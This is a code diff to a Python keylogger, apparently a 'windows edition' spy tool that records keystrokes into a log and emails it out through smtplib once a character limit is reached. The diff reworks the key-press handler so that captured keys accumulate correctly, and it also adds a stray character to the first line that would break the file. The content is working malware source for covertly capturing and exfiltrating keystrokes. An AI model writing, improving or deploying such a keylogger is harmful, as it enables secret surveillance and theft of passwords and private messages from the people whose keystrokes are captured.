@@ -1,4 +1,4 @@
-############  [CODED BY :ANIRUDH] ######### [www.github.com/anii-py] ############### PEACE WITH PYTHON ###############
+v############  [CODED BY :ANIRUDH] ######### [www.github.com/anii-py] ############### PEACE WITH PYTHON ###############
 # windows edition
 
 import smtplib         # To send emails
@@ -11,6 +11,7 @@ except ModuleNotFoundError:
 from email.mime.multipart import MIMEMultipart        
 from email.mime.text import MIMEText                  
 from email.mime.base import MIMEBase                  
+
 print("""
                             
     ███████╗██████╗ ██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
@@ -46,27 +47,26 @@ def on_press(key):
     global sender_email
     global char_limit
 
+    key = str(key)
 
-    
-    
-    if key == Key.space or key == Key.enter:
+    if key == "Key.space" or key == "Key.enter":
         word = word + ' '
         full_log = full_log + word
         word = ''
         if len(full_log) >= char_limit:
             send_log()
             full_log = " "
-    elif key == Key.shift_l or key == Key.shift_r:
+    elif key == "Key.shift_l" or key == "Key.shift_r":
         return
-    elif key == Key.ctrl_l or Key.ctrl_r:
+    elif key == "Key.ctrl_l" or key == "Key.ctrl_r":
         return
-    elif key == Key.backspace:
+    elif key == "Key.backspace":
         word = word[:-1]
     else:
         char = f'{key}'
         char = char[1:-1]
         word += char
-    if key == Key.esc:
+    if key == "Key.esc":
         return False
 
 def send_log():
